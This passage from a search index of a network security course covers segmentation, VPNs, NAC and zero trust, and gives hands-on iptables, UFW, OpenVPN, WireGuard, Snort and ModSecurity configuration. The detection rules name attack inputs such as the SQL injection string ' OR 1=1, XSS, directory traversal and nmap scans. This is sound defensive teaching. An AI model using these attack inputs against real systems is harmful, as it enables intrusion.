inspection adds latency - Bypass risk : If the IPS fails, should traffic flow or stop? Most organizations use both: IPS for known threats and critical systems, IDS for monitoring and detecting new threats.","title":"IPS (Intrusion Prevention System)"},{"location":"LECTURES/unit4/lesson4-1/#network-segmentation","text":"Network segmentation divides a network into multiple smaller networks or zones. This is one of the most effective security controls because it limits the damage from a breach.","title":"Network Segmentation"},{"location":"LECTURES/unit4/lesson4-1/#why-segment","text":"If your entire network is flat (all devices can talk to all other devices), a single compromised device gives an attacker access to everything. This is called lateral movement \u2014moving from one compromised system to others. Segmentation prevents this by: - Isolating critical systems - Limiting blast radius of a breach - Enforcing different security policies for different segments - Improving network performance by reducing broadcast domains","title":"Why Segment?"},{"location":"LECTURES/unit4/lesson4-1/#common-segmentation-strategies","text":"By Function: - Corporate network (employee computers) - Guest network (visitors) - Server network (databases, applications) - Management network (for administering other networks) - IoT network (printers, cameras, smart devices) By Security Level: - Public zone (DMZ) - Internal zone (standard security) - Restricted zone (sensitive data, high security) - Critical zone (payment systems, highest security) By Department: - Engineering network - HR network (handles sensitive employee data) - Finance network (handles financial data) - Sales network","title":"Common Segmentation Strategies"},{"location":"LECTURES/unit4/lesson4-1/#implementation-methods","text":"VLANs (Virtual Local Area Networks): - Logical segmentation on the same physical switches - Devices in different VLANs can't communicate without a router - Configured through software, not physical cables - Cost-effective for most organizations Physical Segmentation : - Completely separate networks with separate hardware - Most secure but expensive - Used for highly sensitive environments Software-Defined Networking (SDN) : - Centrally managed virtual networks - Dynamic, programmable segmentation - Growing in popularity for cloud and data center environments","title":"Implementation Methods"},{"location":"LECTURES/unit4/lesson4-1/#vpn-secure-remote-access","text":"Virtual Private Networks (VPNs) create encrypted tunnels through public networks, allowing secure remote access.","title":"VPN: Secure Remote Access"},{"location":"LECTURES/unit4/lesson4-1/#types-of-vpns","text":"Site-to-Site VPN: - Connects entire networks (like connecting branch offices) - Always-on connection - Transparent to end users Remote Access VPN: - Individual users connect from outside the network - User must authenticate - Common for work-from-home employees SSL/TLS VPN: - Browser-based access - No special client software required - Often used for limited access to specific applications IPsec VPN: - Protocol suite for securing IP communications - More complex but very secure - Industry standard for site-to-site VPNs","title":"Types of VPNs"},{"location":"LECTURES/unit4/lesson4-1/#vpn-security-considerations","text":"Benefits: - Encrypts traffic over untrusted networks - Hides user's actual IP address - Bypasses geographic restrictions Risks: - VPN endpoints are high-value targets - Poorly configured VPNs can be exploited - Compromised VPN credentials give attackers direct network access - VPN traffic can be difficult to inspect for threats","title":"VPN Security Considerations"},{"location":"LECTURES/unit4/lesson4-1/#network-access-control-nac","text":"NAC systems control which devices can connect to your network and what they can access once connected.","title":"Network Access Control (NAC)"},{"location":"LECTURES/unit4/lesson4-1/#how-nac-works","text":"Before a device connects: 1. Device attempts to connect 2. NAC system challenges it (authenticate yourself) 3. NAC checks device compliance (is antivirus updated? OS patched? Authorized device?) 4. Based on results, NAC either allows full access, quarantines the device, or blocks it entirely","title":"How NAC Works"},{"location":"LECTURES/unit4/lesson4-1/#use-cases","text":"BYOD (Bring Your Own Device) environments : Personal laptops and phones connecting to corporate networks Guest access : Give visitors internet access without internal network access Compliance enforcement : Ensure all devices meet security standards before connecting Quarantine networks : Isolate infected devices until they're cleaned","title":"Use Cases"},{"location":"LECTURES/unit4/lesson4-1/#zero-trust-architecture","text":"The traditional security model assumed \"inside the network\" = trusted and \"outside\" = untrusted. But modern threats (insider threats, compromised devices, remote work) make this obsolete. Zero Trust assumes: - Never trust, always verify - No device or user is trusted by default - Verify explicitly for every access request - Minimize user access (principle of least privilege) - Assume breach (design for damage containment)","title":"Zero Trust Architecture"},{"location":"LECTURES/unit4/lesson4-1/#zero-trust-implementation","text":"Identity and Access Management (IAM): - Multi-factor authentication (MFA) for all users - Continuous authentication - Risk-based access (different access levels based on context) Micro-segmentation: - Granular network segments, sometimes per-application - Strict controls between segments - Limits lateral movement to nearly zero Continuous Monitoring: - Log everything - Analyze behavior constantly - Detect and respond to anomalies in real-time Least Privilege Access: - Users only get the minimum access needed - Time-limited access for administrative tasks - Just-in-time access provisioning Zero Trust is the future of network security, especially as networks become more distributed with cloud services and remote work.","title":"Zero Trust Implementation"},{"location":"LECTURES/unit4/lesson4-1/#cloud-network-security","text":"As organizations move to cloud platforms (AWS, Azure, Google Cloud), network security changes but remains critical.","title":"Cloud Network Security"},{"location":"LECTURES/unit4/lesson4-1/#cloud-specific-challenges","text":"Shared responsibility model : Cloud provider secures the infrastructure; you secure your applications and data Virtual networks : Everything is software-defined Multi-tenancy : Your workloads share physical infrastructure with other customers API-driven : Configuration happens through APIs, creating new attack vectors","title":"Cloud-Specific Challenges"},{"location":"LECTURES/unit4/lesson4-1/#cloud-security-tools","text":"Security Groups : Virtual firewalls for cloud instances Network ACLs : Subnet-level filtering VPC (Virtual Private Cloud) : Isolated network environments in the cloud Cloud Access Security Brokers (CASB) : Monitor and secure cloud service usage","title":"Cloud Security Tools"},{"location":"LECTURES/unit4/lesson4-1/#real-world-scenarios","text":"Let's look at how these technologies work together in practice:","title":"Real-World Scenarios"},{"location":"LECTURES/unit4/lesson4-1/#scenario-1-remote-worker-connecting","text":"Employee's laptop connects to company VPN NAC system checks: is device authorized? Is software updated? VPN authenticates user with username, password, and MFA token VPN creates encrypted tunnel User placed in appropriate network segment based on role Firewall rules allow access only to needed resources IPS monitors traffic for suspicious behavior All activity logged for security analysis","title":"Scenario 1: Remote Worker Connecting"},{"location":"LECTURES/unit4/lesson4-1/#scenario-2-public-web-application","text":"User visits company website Traffic hits web application firewall (WAF) WAF inspects request for SQL injection, XSS, etc. Clean request passes to load balancer Web server in DMZ handles request Web server queries database in internal network Firewall between DMZ and internal network only allows specific database queries Response travels back through same path All stages logged and monitored","title":"Scenario 2: Public Web Application"},{"location":"LECTURES/unit4/lesson4-1/#scenario-3-suspected-breach","text":"IDS detects unusual outbound connection from internal server Alert goes to SOC Analyst investigates: server is compromised Firewall immediately blocks server's network access (quarantine) Incident response team examines server Network logs reviewed to determine scope Other systems in same segment scanned for compromise After cleanup, server returns to production with enhanced monitoring","title":"Scenario 3: Suspected Breach"},{"location":"LECTURES/unit4/lesson4-1/#practical-tools","text":"Here are tools you'll actually use in network security: Wireshark : Capture and analyze network packets Nmap : Network scanning and service discovery Snort : Open-source IDS/IPS pfSense : Open-source firewall and router Zeek (formerly Bro): Network security monitoring tcpdump : Command-line packet capture iptables/nftables : Linux firewall configuration We'll dive deeper into many of these tools in upcoming lessons.","title":"Practical Tools"},{"location":"LECTURES/unit4/lesson4-1/#key-takeaways","text":"Network security in practice means: - Multiple layers of defense - Continuous monitoring and analysis - Segmentation to limit damage - Strong access controls - Regular updates and patching - Incident response preparedness No network is 100% secure, but with proper implementation of these technologies and strategies, you can make it extremely difficult for attackers to succeed. The goal isn't perfection\u2014it's making your network harder to attack than your competitors' networks, and ensuring that when breaches do occur, you can detect and respond quickly.","title":"Key Takeaways"},{"location":"LECTURES/unit4/lesson4-2/","text":"Implementing Network Security Controls Theory is one thing\u2014implementation is another. This lesson focuses on actually setting up and configuring security controls. These are hands-on skills you'll use daily as a security professional. Configuring Firewalls Linux iptables iptables is the traditional Linux firewall. Basic Concepts Tables: - filter : Default, for packet filtering - nat : Network address translation - mangle : Packet alteration - raw : Connection tracking exemptions Chains: - INPUT : Packets destined for this system - OUTPUT : Packets originating from this system - FORWARD : Packets passing through this system Targets: - ACCEPT : Allow the packet - DROP : Silently discard - REJECT : Discard and send error - LOG : Log the packet Common iptables Commands # View current rules sudo iptables -L -v -n # View with line numbers sudo iptables -L --line-numbers # Flush all rules (dangerous!) sudo iptables -F # Set default policies sudo iptables -P INPUT DROP sudo iptables -P FORWARD DROP sudo iptables -P OUTPUT ACCEPT Building a Basic Firewall # Allow loopback sudo iptables -A INPUT -i lo -j ACCEPT # Allow established connections sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT # Allow SSH (port 22) sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT # Allow HTTP and HTTPS sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT # Allow ping sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT # Log and drop everything else sudo iptables -A INPUT -j LOG --log-prefix \"IPTables-Dropped: \" sudo iptables -A INPUT -j DROP Rate Limiting (Anti-DDoS) # Limit SSH connections sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP # Limit ping sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 3 -j ACCEPT sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP Port Knocking Hidden SSH access: # Close SSH by default sudo iptables -A INPUT -p tcp --dport 22 -j DROP # Knock sequence: 7000, 8000, 9000 sudo iptables -A INPUT -p tcp --dport 7000 -m recent --name SSH0 --set -j DROP sudo iptables -A INPUT -p tcp --dport 8000 -m recent --name SSH0 --rcheck -m recent --name SSH1 --set -j DROP sudo iptables -A INPUT -p tcp --dport 9000 -m recent --name SSH1 --rcheck -m recent --name SSH2 --set -j DROP sudo iptables -A INPUT -p tcp --dport 22 -m recent --name SSH2 --rcheck -j ACCEPT Saving Rules # Debian/Ubuntu sudo iptables-save > /etc/iptables/rules.v4 sudo ip6tables-save > /etc/iptables/rules.v6 # Or use iptables-persistent sudo apt install iptables-persistent sudo netfilter-persistent save UFW (Uncomplicated Firewall) Easier iptables frontend: Basic UFW Usage # Enable UFW sudo ufw enable # Check status sudo ufw status verbose # Default policies sudo ufw default deny incoming sudo ufw default allow outgoing # Allow services sudo ufw allow ssh sudo ufw allow 80/tcp sudo ufw allow 443/tcp # Allow from specific IP sudo ufw allow from 192.168.1.100 # Allow specific IP to specific port sudo ufw allow from 192.168.1.100 to any port 22 # Deny port sudo ufw deny 23 # Delete rule sudo ufw delete allow 80 # Reset all rules sudo ufw reset Application Profiles # List application profiles sudo ufw app list # Allow application sudo ufw allow 'Apache Full' sudo ufw allow 'OpenSSH' # View application info sudo ufw app info 'Apache Full' Rate Limiting # Limit SSH connections (6 connections in 30 seconds) sudo ufw limit ssh Setting Up VPNs OpenVPN Server Installation # Install OpenVPN and Easy-RSA sudo apt install openvpn easy-rsa # Set up CA directory make-cadir ~/openvpn-ca cd ~/openvpn-ca Configure PKI # Edit vars file nano vars # Set these: export KEY_COUNTRY=\"US\" export KEY_PROVINCE=\"CA\" export KEY_CITY=\"SanFrancisco\" export KEY_ORG=\"MyOrg\" export KEY_EMAIL=\"admin@myorg.com\" export KEY_OU=\"MyOrgUnit\" # Source vars source vars # Clean and build CA ./clean-all ./build-ca Generate Certificates # Server certificate ./build-key-server server # Client certificate ./build-key client1 # Diffie-Hellman parameters ./build-dh # HMAC signature openvpn --genkey --secret keys/ta.key Server Configuration # Create server config sudo nano /etc/openvpn/server.conf port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh2048.pem tls-auth ta.key 0 server 10.8.0.0 255.255.255.0 ifconfig-pool-persist ipp.txt push \"redirect-gateway def1 bypass-dhcp\" push \"dhcp-option DNS 8.8.8.8\" push \"dhcp-option DNS 8.8.4.4\" keepalive 10 120 cipher AES-256-CBC auth SHA256 user nobody group nogroup persist-key persist-tun status openvpn-status.log log-append /var/log/openvpn.log verb 3 Enable IP Forwarding # Temporarily sudo sysctl -w net.ipv4.ip_forward=1 # Permanently sudo nano /etc/sysctl.conf # Uncomment: net.ipv4.ip_forward=1 sudo sysctl -p NAT for VPN Clients # Add iptables NAT rule sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE # Save rule sudo netfilter-persistent save Start OpenVPN sudo systemctl start openvpn@server sudo systemctl enable openvpn@server Client Configuration client dev tun proto udp remote vpn-server.com 1194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt cert client1.crt key client1.key tls-auth ta.key 1 cipher AES-256-CBC auth SHA256 verb 3 WireGuard (Modern Alternative) Installation sudo apt install wireguard Generate Keys # Server keys wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey # Client keys (do this on client) wg genkey | tee privatekey | wg pubkey > publickey Server Configuration sudo nano /etc/wireguard/wg0.conf [Interface] Address = 10.0.0.1/24 ListenPort = 51820 PrivateKey = <server-private-key> PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE [Peer] PublicKey = <client-public-key> AllowedIPs = 10.0.0.2/32 Start WireGuard sudo wg-quick up wg0 sudo systemctl enable wg-quick@wg0 Client Configuration [Interface] PrivateKey = <client-private-key> Address = 10.0.0.2/24 DNS = 8.8.8.8 [Peer] PublicKey = <server-public-key> Endpoint = vpn-server.com:51820 AllowedIPs = 0.0.0.0/0 PersistentKeepalive = 25 Intrusion Detection Systems Snort Installation and Configuration Install Snort sudo apt install snort Configuration sudo nano /etc/snort/snort.conf # Set home network var HOME_NET 192.168.1.0/24 var EXTERNAL_NET !$HOME_NET # Set rule paths var RULE_PATH /etc/snort/rules var SO_RULE_PATH /etc/snort/so_rules var PREPROC_RULE_PATH /etc/snort/preproc_rules # Output output alert_fast: alert output log_tcpdump: tcpdump.log Writing Snort Rules Rule structure: action protocol src_ip src_port direction dest_ip dest_port (options) Examples: # Alert on ICMP ping alert icmp any any -> $HOME_NET any (msg:\"ICMP Ping Detected\"; sid:1000001;) # Alert on SSH brute force alert tcp any any -> $HOME_NET 22 (msg:\"Possible SSH Brute Force\"; flags: S; threshold: type both, track by_src, count 5, seconds 60; sid:1000002;) # Alert on SQL injection attempt alert tcp any any -> $HOME_NET 80 (msg:\"SQL Injection Attempt\"; content:\"' OR 1=1\"; nocase; sid:1000003;) # Alert on nmap scan alert tcp any any -> $HOME_NET any (msg:\"Nmap Scan Detected\"; flags:S; detection_filter: track by_src, count 20, seconds 60; sid:1000004;) Rule options: - msg : Alert message - sid : Signature ID (unique) - content : Look for specific content - nocase : Case-insensitive - flags : TCP flags (S=SYN, A=ACK, F=FIN, R=RST) - threshold : Rate limiting - detection_filter : Advanced rate limiting Running Snort # Test configuration sudo snort -T -c /etc/snort/snort.conf # Run in IDS mode sudo snort -A console -q -c /etc/snort/snort.conf -i eth0 # Run in IPS mode (inline) sudo snort -Q --daq afpacket -i eth0:eth1 -c /etc/snort/snort.conf Suricata (Modern Alternative) # Install sudo apt install suricata # Update rules sudo suricata-update # Run Suricata sudo suricata -c /etc/suricata/suricata.yaml -i eth0 # View alerts tail -f /var/log/suricata/fast.log Network Access Control (NAC) PacketFence Setup Open-source NAC solution: Installation # Add repository echo \"deb http://inverse.ca/downloads/PacketFence/debian/ buster buster\" | sudo tee /etc/apt/sources.list.d/packetfence.list wget -O - https://inverse.ca/downloads/GPG_PUBLIC_KEY | sudo apt-key add - # Install sudo apt update sudo apt install packetfence Configuration Web interface: http://server-ip:1443 Configure: 1. Network interfaces (management, registration, isolation) 2. Switch configuration 3. Authentication sources (AD, RADIUS, LDAP) 4. Violation policies 5. Provisioners (MDM integration) 802.1X Configuration On switch (Cisco example): aaa new-model aaa authentication dot1x default group radius aaa authorization network default group radius dot1x system-auth-control interface GigabitEthernet1/0/1 switchport mode access authentication port-control auto dot1x pae authenticator RADIUS server (FreeRADIUS): # Install sudo apt install freeradius # Configure client (switch) sudo nano /etc/freeradius/3.0/clients.conf client switch1 { ipaddr = 192.168.1.10 secret = shared-secret shortname = switch1 } Web Application Firewall (WAF) ModSecurity with Apache Installation sudo apt install libapache2-mod-security2 # Enable sudo a2enmod security2 sudo systemctl restart apache2 Configuration # Copy recommended config sudo cp /etc/modsecurity/modsecurity.conf-recommended /etc/modsecurity/modsecurity.conf # Edit config sudo nano /etc/modsecurity/modsecurity.conf # Enable ModSecurity SecRuleEngine On # Set detection only (for testing) # SecRuleEngine DetectionOnly # Audit logging SecAuditEngine RelevantOnly SecAuditLog /var/log/apache2/modsec_audit.log OWASP Core Rule Set # Install CRS cd /etc/modsecurity sudo git clone https://github.com/coreruleset/coreruleset.git cd coreruleset sudo mv crs-setup.conf.example crs-setup.conf # Include in Apache sudo nano /etc/apache2/mods-enabled/security2.conf IncludeOptional /etc/modsecurity/*.conf IncludeOptional /etc/modsecurity/coreruleset/crs-setup.conf IncludeOptional /etc/modsecurity/coreruleset/rules/*.conf sudo systemctl restart apache2 Custom Rules sudo nano /etc/modsecurity/modsecurity_custom.conf # Block SQL injection SecRule ARGS \"@detectSQLi\" \"id:1001,phase:2,deny,status:403,msg:'SQL Injection Attempt'\" # Block XSS SecRule ARGS \"@detectXSS\" \"id:1002,phase:2,deny,status:403,msg:'XSS Attempt'\" # Block directory traversal SecRule ARGS \"@contains ../\" \"id:1003,phase:2,deny,status:403,msg:'Directory Traversal Attempt'\" # Rate limiting SecAction \"id:1004,phase:1,nolog,pass,initcol:ip=%{REMOTE_ADDR}\" SecRule IP:REQUEST_COUNT \"@gt 100\" \"id:1005,phase:2,deny,status:429,msg:'Rate Limit Exceeded',setvar:ip.request_count=+1\" Security Monitoring Centralized Logging with ELK Stack Elasticsearch Installation # Add repository wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - echo \"deb https://artifacts.elastic.co/packages/7.x/apt stable main\" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list # Install sudo apt update sudo apt install elasticsearch # Configure sudo nano /etc/elasticsearch/elasticsearch.yml network.host: localhost http.port: 9200 # Start sudo systemctl start elasticsearch sudo systemctl enable elasticsearch Logstash Installation sudo apt install logstash # Create configuration sudo nano /etc/logstash/conf.d/syslog.conf input { syslog { port => 5514 } } filter { if [program] == \"sshd\" { grok { match => { \"message\" => \"%{DATA:auth_method} %{DATA:auth_result} for %{DATA:user} from %{IP:src_ip}\" } } } } output { elasticsearch { hosts => [\"localhost:9200\"] index => \"syslog-%{+YYYY.MM.dd}\" } } # Start sudo systemctl start logstash sudo systemctl enable logstash Kibana Installation sudo apt install kibana # Configure sudo nano /etc/kibana/kibana.yml server.host: \"localhost\" elasticsearch.hosts: [\"http://localhost:9200\"] # Start sudo systemctl start kibana sudo systemctl enable kibana Access Kibana: http://localhost:5601 SIEM Rules Failed login detection: # In Kibana, create alert: Index: syslog-* Query: program:\"sshd\" AND message:\"Failed password\" Threshold: > 5 in 5 minutes Action: Email alert Key Takeaways Hands-on skills covered: - Firewall configuration (iptables, UFW) - VPN setup (OpenVPN, WireGuard) - IDS implementation (Snort, Suricata) - NAC deployment (802.1X) - WAF configuration (ModSecurity) - Centralized logging (ELK Stack) Best practices: - Test in lab before production - Document all configurations - Monitor logs for alerts - Regular rule updates - Performance testing - Backup configurations Remember: - Security controls must be maintained - Rules need constant tuning - False positives are normal (at first) - Defense in depth\u2014use multiple controls These are real-world skills. Practice them in virtual machines, build a home lab, and experiment. Reading about security is good; doing security is better.","title":"Lesson 4.2"},{"location":"LECTURES/unit4/lesson4-2/#implementing-network-security-controls","text":"Theory is one thing\u2014implementation is another. This lesson focuses on actually setting up and configuring security controls. These are hands-on skills you'll use daily as a security professional.","title":"Implementing Network Security Controls"},{"location":"LECTURES/unit4/lesson4-2/#configuring-firewalls","text":"","title":"Configuring Firewalls"},{"location":"LECTURES/unit4/lesson4-2/#linux-iptables","text":"iptables is the traditional Linux firewall.","title":"Linux iptables"},{"location":"LECTURES/unit4/lesson4-2/#basic-concepts","text":"Tables: - filter : Default, for packet filtering - nat : Network address translation - mangle : Packet alteration - raw : Connection tracking exemptions Chains: - INPUT : Packets destined for this system - OUTPUT : Packets originating from this system - FORWARD : Packets passing through this system Targets: - ACCEPT : Allow the packet - DROP : Silently discard - REJECT : Discard and send error - LOG : Log the packet","title":"Basic Concepts"},{"location":"LECTURES/unit4/lesson4-2/#common-iptables-commands","text":"# View current rules sudo iptables -L -v -n # View with line numbers sudo iptables -L --line-numbers # Flush all rules (dangerous!) sudo iptables -F # Set default policies sudo iptables -P INPUT DROP sudo iptables -P FORWARD DROP sudo iptables -P OUTPUT ACCEPT","title":"Common iptables Commands"},{"location":"LECTURES/unit4/lesson4-2/#building-a-basic-firewall","text":"# Allow loopback sudo iptables -A INPUT -i lo -j ACCEPT # Allow established connections sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT # Allow SSH (port 22) sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT # Allow HTTP and HTTPS sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT # Allow ping sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT # Log and drop everything else sudo iptables -A INPUT -j LOG --log-prefix \"IPTables-Dropped: \" sudo iptables -A INPUT -j DROP","title":"Building a Basic Firewall"},{"location":"LECTURES/unit4/lesson4-2/#rate-limiting-anti-ddos","text":"# Limit SSH connections sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP # Limit ping sudo iptables -A INPUT -p icmp --icmp-type echo-request -m limit --limit 1/s --limit-burst 3 -j ACCEPT sudo iptables -A INPUT -p icmp --icmp-type echo-request -j DROP","title":"Rate Limiting (Anti-DDoS)"},{"location":"LECTURES/unit4/lesson4-2/#port-knocking","text":"Hidden SSH access: # Close SSH by default sudo iptables -A INPUT -p tcp --dport 22 -j DROP # Knock sequence: 7000, 8000, 9000 sudo iptables -A INPUT -p tcp --dport 7000 -m recent --name SSH0 --set -j DROP sudo iptables -A INPUT -p tcp --dport 8000 -m recent --name SSH0 --rcheck -m recent --name SSH1 --set -j DROP sudo iptables -A INPUT -p tcp --dport 9000 -m recent --name SSH1 --rcheck -m recent --name SSH2 --set -j DROP sudo iptables -A INPUT -p tcp --dport 22 -m recent --name SSH2 --rcheck -j ACCEPT","title":"Port Knocking"},{"location":"LECTURES/unit4/lesson4-2/#saving-rules","text":"# Debian/Ubuntu sudo iptables-save > /etc/iptables/rules.v4 sudo ip6tables-save > /etc/iptables/rules.v6 # Or use iptables-persistent sudo apt install iptables-persistent sudo netfilter-persistent save","title":"Saving Rules"},{"location":"LECTURES/unit4/lesson4-2/#ufw-uncomplicated-firewall","text":"Easier iptables frontend:","title":"UFW (Uncomplicated Firewall)"},{"location":"LECTURES/unit4/lesson4-2/#basic-ufw-usage","text":"# Enable UFW sudo ufw enable # Check status sudo ufw status verbose # Default policies sudo ufw default deny incoming sudo ufw default allow outgoing # Allow services sudo ufw allow ssh sudo ufw allow 80/tcp sudo ufw allow 443/tcp # Allow from specific IP sudo ufw allow from 192.168.1.100 # Allow specific IP to specific port sudo ufw allow from 192.168.1.100 to any port 22 # Deny port sudo ufw deny 23 # Delete rule sudo ufw delete allow 80 # Reset all rules sudo ufw reset","title":"Basic UFW Usage"},{"location":"LECTURES/unit4/lesson4-2/#application-profiles","text":"# List application profiles sudo ufw app list # Allow application sudo ufw allow 'Apache Full' sudo ufw allow 'OpenSSH' # View application info sudo ufw app info 'Apache Full'","title":"Application Profiles"},{"location":"LECTURES/unit4/lesson4-2/#rate-limiting","text":"# Limit SSH connections (6 connections in 30 seconds) sudo ufw limit ssh","title":"Rate Limiting"},{"location":"LECTURES/unit4/lesson4-2/#setting-up-vpns","text":"","title":"Setting Up VPNs"},{"location":"LECTURES/unit4/lesson4-2/#openvpn-server","text":"","title":"OpenVPN Server"},{"location":"LECTURES/unit4/lesson4-2/#installation","text":"# Install OpenVPN and Easy-RSA sudo apt install openvpn easy-rsa # Set up CA directory make-cadir ~/openvpn-ca cd ~/openvpn-ca","title":"Installation"},{"location":"LECTURES/unit4/lesson4-2/#configure-pki","text":"# Edit vars file nano vars # Set these: export KEY_COUNTRY=\"US\" export KEY_PROVINCE=\"CA\" export KEY_CITY=\"SanFrancisco\" export KEY_ORG=\"MyOrg\" export KEY_EMAIL=\"admin@myorg.com\" export KEY_OU=\"MyOrgUnit\" # Source vars source vars # Clean and build CA ./clean-all ./build-ca","title":"Configure PKI"},{"location":"LECTURES/unit4/lesson4-2/#generate-certificates","text":"# Server certificate ./build-key-server server # Client certificate ./build-key client1 # Diffie-Hellman parameters ./build-dh # HMAC signature openvpn --genkey --secret keys/ta.key","title":"Generate Certificates"},{"location":"LECTURES/unit4/lesson4-2/#server-configuration","text":"# Create server config sudo nano /etc/openvpn/server.conf port 1194 proto udp dev tun ca ca.crt cert server.crt key server.key dh dh2048.pem tls-auth ta.key 0 server 10.8.0.0 255.255.255.0 ifconfig-pool-persist ipp.txt push \"redirect-gateway def1 bypass-dhcp\" push \"dhcp-option DNS 8.8.8.8\" push \"dhcp-option DNS 8.8.4.4\" keepalive 10 120 cipher AES-256-CBC auth SHA256 user nobody group nogroup persist-key persist-tun status openvpn-status.log log-append /var/log/openvpn.log verb 3","title":"Server Configuration"},{"location":"LECTURES/unit4/lesson4-2/#enable-ip-forwarding","text":"# Temporarily sudo sysctl -w net.ipv4.ip_forward=1 # Permanently sudo nano /etc/sysctl.conf # Uncomment: net.ipv4.ip_forward=1 sudo sysctl -p","title":"Enable IP Forwarding"},{"location":"LECTURES/unit4/lesson4-2/#nat-for-vpn-clients","text":"# Add iptables NAT rule sudo iptables -t nat -A POSTROUTING -s 10.8.0.0/24 -o eth0 -j MASQUERADE # Save rule sudo netfilter-persistent save","title":"NAT for VPN Clients"},{"location":"LECTURES/unit4/lesson4-2/#start-openvpn","text":"sudo systemctl start openvpn@server sudo systemctl enable openvpn@server","title":"Start OpenVPN"},{"location":"LECTURES/unit4/lesson4-2/#client-configuration","text":"client dev tun proto udp remote vpn-server.com 1194 resolv-retry infinite nobind persist-key persist-tun ca ca.crt cert client1.crt key client1.key tls-auth ta.key 1 cipher AES-256-CBC auth SHA256 verb 3","title":"Client Configuration"},{"location":"LECTURES/unit4/lesson4-2/#wireguard-modern-alternative","text":"","title":"WireGuard (Modern Alternative)"},{"location":"LECTURES/unit4/lesson4-2/#installation_1","text":"sudo apt install wireguard","title":"Installation"},{"location":"LECTURES/unit4/lesson4-2/#generate-keys","text":"# Server keys wg genkey | sudo tee /etc/wireguard/privatekey | wg pubkey | sudo tee /etc/wireguard/publickey # Client keys (do this on client) wg genkey | tee privatekey | wg pubkey > publickey","title":"Generate Keys"},{"location":"LECTURES/unit4/lesson4-2/#server-configuration_1","text":"sudo nano /etc/wireguard/wg0.conf [Interface] Address = 10.0.0.1/24 ListenPort = 51820 PrivateKey = <server-private-key> PostUp = iptables -A FORWARD -i wg0 -j ACCEPT; iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE PostDown = iptables -D FORWARD -i wg0 -j ACCEPT; iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE [Peer] PublicKey = <client-public-key> AllowedIPs = 10.0.0.2/32","title":"Server Configuration"},{"location":"LECTURES/unit4/lesson4-2/#start-wireguard","text":"sudo wg-quick up wg0 sudo systemctl enable wg-quick@wg0","title":"Start WireGuard"},{"location":"LECTURES/unit4/lesson4-2/#client-configuration_1","text":"[Interface] PrivateKey = <client-private-key> Address = 10.0.0.2/24 DNS = 8.8.8.8 [Peer] PublicKey = <server-public-key> Endpoint = vpn-server.com:51820 AllowedIPs = 0.0.0.0/0 PersistentKeepalive = 25","title":"Client Configuration"},{"location":"LECTURES/unit4/lesson4-2/#intrusion-detection-systems","text":"","title":"Intrusion Detection Systems"},{"location":"LECTURES/unit4/lesson4-2/#snort-installation-and-configuration","text":"","title":"Snort Installation and Configuration"},{"location":"LECTURES/unit4/lesson4-2/#install-snort","text":"sudo apt install snort","title":"Install Snort"},{"location":"LECTURES/unit4/lesson4-2/#configuration","text":"sudo nano /etc/snort/snort.conf # Set home network var HOME_NET 192.168.1.0/24 var EXTERNAL_NET !$HOME_NET # Set rule paths var RULE_PATH /etc/snort/rules var SO_RULE_PATH /etc/snort/so_rules var PREPROC_RULE_PATH /etc/snort/preproc_rules # Output output alert_fast: alert output log_tcpdump: tcpdump.log","title":"Configuration"},{"location":"LECTURES/unit4/lesson4-2/#writing-snort-rules","text":"Rule structure: action protocol src_ip src_port direction dest_ip dest_port (options) Examples: # Alert on ICMP ping alert icmp any any -> $HOME_NET any (msg:\"ICMP Ping Detected\"; sid:1000001;) # Alert on SSH brute force alert tcp any any -> $HOME_NET 22 (msg:\"Possible SSH Brute Force\"; flags: S; threshold: type both, track by_src, count 5, seconds 60; sid:1000002;) # Alert on SQL injection attempt alert tcp any any -> $HOME_NET 80 (msg:\"SQL Injection Attempt\"; content:\"' OR 1=1\"; nocase; sid:1000003;) # Alert on nmap scan alert tcp any any -> $HOME_NET any (msg:\"Nmap Scan Detected\"; flags:S; detection_filter: track by_src, count 20, seconds 60; sid:1000004;) Rule options: - msg : Alert message - sid : Signature ID (unique) - content : Look for specific content - nocase : Case-insensitive - flags : TCP flags (S=SYN, A=ACK, F=FIN, R=RST) - threshold : Rate limiting - detection_filter : Advanced rate limiting","title":"Writing Snort Rules"},{"location":"LECTURES/unit4/lesson4-2/#running-snort","text":"# Test configuration sudo snort -T -c /etc/snort/snort.conf # Run in IDS mode sudo snort -A console -q -c /etc/snort/snort.conf -i eth0 # Run in IPS mode (inline) sudo snort -Q --daq afpacket -i eth0:eth1 -c /etc/snort/snort.conf","title":"Running Snort"},{"location":"LECTURES/unit4/lesson4-2/#suricata-modern-alternative","text":"# Install sudo apt install suricata # Update rules sudo suricata-update # Run Suricata sudo suricata -c /etc/suricata/suricata.yaml -i eth0 # View alerts tail -f 